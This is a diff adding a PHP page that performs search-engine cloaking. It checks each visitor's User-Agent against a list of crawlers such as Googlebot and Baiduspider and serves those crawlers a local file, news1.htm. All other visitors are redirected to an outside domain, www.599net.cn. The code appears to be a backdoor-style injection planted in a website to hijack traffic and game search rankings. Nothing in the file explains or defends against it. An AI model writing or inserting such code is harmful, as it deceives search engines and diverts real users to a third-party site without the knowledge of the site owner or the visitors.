@@ -1,0 +1,44 @@
+<!-- saved from url=(URL长度)URL-->
+<!--STATUS OK-->
+<meta name="robots" content="noarchive">
+<meta name="robots" content="all">
+<?php
+// 下面是一些常见的蜘蛛名
+$flag = false;
+$tmp = $_SERVER['HTTP_USER_AGENT'];
+if(strpos($tmp, 'Googlebot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Baiduspider') >0){
+    $flag = true;
+} else if(strpos($tmp, 'Yahoo! Slurp') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'msnbot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Sosospider') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'YodaoBot') !== false || strpos($tmp, 'OutfoxBot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Sogou web spider') !== false || strpos($tmp, 'Sogou Orion spider') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'fast-webcrawler') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Gaisbot') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'ia_archiver') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'altavista') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'lycos_spider') !== false){
+    $flag = true;
+} else if(strpos($tmp, 'Inktomi slurp') !== false){
+    $flag = true;
+}
+if($flag == false){
+   //正常用户代码
+    header("Location: http://www.599net.cn");
+			 exit();
+} else {
+   //蜘蛛处理代码
+    require_once("news1.htm");
+}
+?>
